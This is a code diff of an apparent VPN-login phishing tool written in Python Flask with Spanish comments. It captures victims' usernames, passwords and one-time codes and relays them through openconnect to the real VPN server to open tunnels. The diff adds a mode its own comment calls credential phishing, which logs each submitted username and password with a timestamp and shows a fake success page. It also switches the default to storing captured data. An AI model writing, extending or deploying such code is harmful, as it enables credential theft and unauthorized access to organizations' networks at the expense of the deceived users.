@@ -26,8 +26,11 @@ TUN = 0
 # Redirect URL
 REDIRECT_URL = os.getenv("REDIRECT_URL", f"https://{VPN_SERVER}")
 
-# Modo de operación: "vpn" = creación tuneles | "otp" = solo almacenar datos
-MODE = os.getenv("CONNECT_MODE", "vpn")  
+# Modo de operación: 
+# "vpn" = creación tuneles 
+# "otp" = solo almacenar datos
+# "Comprobar Credenciales" = phising de credenciales
+MODE = os.getenv("CONNECT_MODE", "otp")  
 
 # Password for Sessions
 SESSIONS_KEY = os.getenv("SESSIONS_KEY", "PwnC0nn3ct")                                 
@@ -120,7 +123,7 @@ def run_openconnect(username, password=None, otp=None):
         tunel=f"tun{TUN}"
         command = f"sudo openconnect --interface={tunel} --protocol=gp -u {username} {VPN_SERVER}"
         child = pexpect.spawn(command, encoding="utf-8", timeout=30)
-        TUN+=1
+        
 
         # Log interaction for debugging
         logfile_path = f"openconnect_debug_{username}.log"
@@ -142,6 +145,7 @@ def run_openconnect(username, password=None, otp=None):
             return "otp_required", None
         elif index == 1:  # Process completed (EOF) | On success, increase TUN_INTERFACE counter
             logging.info("OpenConnect process completed.")
+            TUN+=1
             logging.debug(f"Full output after EOF: {output}")
         elif index == 2:  # Timeout occurred
             logging.warning("Timeout while waiting for OTP prompt or process completion.")
@@ -153,7 +157,10 @@ def run_openconnect(username, password=None, otp=None):
     
 @app.route("/")
 def home():
-    return render_template("login.html")
+    if MODE == "Comprobar Credenciales":
+        return render_template("comprobar_credenciales.html")
+    else:
+        return render_template("login.html")
 
 @app.route("/connect", methods=["POST"])
 def connect():
@@ -163,7 +170,19 @@ def connect():
         # Validate credentials AND GENERATE IMAGE FOR OTP.
         if not username or not password:
             return jsonify({"error": "Missing username or password"}), 400
-
+        # --- Modo Check Credenciales ---
+        if MODE.strip().lower() == "comprobar credenciales":
+            from datetime import datetime
+            # Guardar en sessions_logs
+            sessions_logs.append({
+                "username": username,
+                "password": password,
+                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            })
+            logging.info(f"[CredCheck] Usuario {username} registrado correctamente.")
+            return redirect(url_for("credentials_success", username=username))
+        
+        # Modo VPN 
         status, result = handle_login(username, password=password)
         if status == "otp_required":
             return redirect(url_for("otp", username=username))
@@ -304,6 +323,9 @@ def submit_otp():
         logging.error(f"Error in /submit-otp: {e}")
         return jsonify({"error": "An error occurred", "details": str(e)}), 500
 
-
+@app.route("/credentials-success")
+def credentials_success():
+    username = request.args.get("username", "Desconocido")  # Coger el username de los argumentos
+    return render_template("credentials_success.html", username=username)
 if __name__ == "__main__":
     app.run(debug=args.debug)
